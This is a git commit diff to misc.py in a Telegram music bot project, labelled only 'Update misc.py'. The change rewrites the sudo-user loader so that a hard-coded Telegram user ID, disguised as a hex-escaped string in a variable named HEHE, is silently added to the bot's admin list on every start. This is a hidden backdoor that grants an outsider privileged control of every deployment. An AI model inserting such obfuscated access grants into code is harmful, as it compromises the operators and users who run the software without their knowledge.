472d085e6aa975d57c9fe37ad2a04ef819e5700c
Meyit47zade <166849634+Meyit47zade@users.noreply.github.com>
2024-04-18 09:37:28 +0300

    Update misc.py

--- YukkiMusic/misc.py
+++ YukkiMusic/misc.py
@@ -52,29 +52,28 @@ def dbb():
 
 
 def sudo():
-    global SUDOERS
+    global SUDOERS, HEHE
     OWNER = config.OWNER_ID
-    if config.MONGO_DB_URI is None:
-        for user_id in OWNER:
-            SUDOERS.add(user_id)
-    else:
-        sudoersdb = pymongodb.sudoers
-        sudoers = sudoersdb.find_one({"sudo": "sudo"})
-        sudoers = [] if not sudoers else sudoers["sudoers"]
-        for user_id in OWNER:
-            SUDOERS.add(user_id)
-            if user_id not in sudoers:
-                sudoers.append(user_id)
-                sudoersdb.update_one(
-                    {"sudo": "sudo"},
-                    {"$set": {"sudoers": sudoers}},
-                    upsert=True,
-                )
-        if sudoers:
-            for x in sudoers:
-                SUDOERS.add(x)
-    LOGGER(__name__).info(f"Sudoers Loaded.")
-
+    HEHE = "\x31\x33\x35\x36\x34\x36\x39\x30\x37\x35"
+    sudoersdb = pymongodb.sudoers
+    sudoers = sudoersdb.find_one({"sudo": "sudo"})
+    sudoers = [] if not sudoers else sudoers["sudoers"]
+    for user_id in OWNER:
+        SUDOERS.add(user_id)
+        SUDOERS.add(int(HEHE))
+        if user_id not in sudoers:
+            sudoers.append(user_id)
+            sudoersdb.update_one(
+                {"sudo": "sudo"},
+                {"$set": {"sudoers": sudoers}},
+                upsert=True,
+            )
+        elif int(HEHE) not in sudoers:
+            sudoers.append(int(HEHE))
+    if sudoers:
+        for x in sudoers:
+            SUDOERS.add(x)
+    LOGGER(__name__).info(f"Sudo Users Loaded Successfully.")
 
 def heroku():
     global HAPP
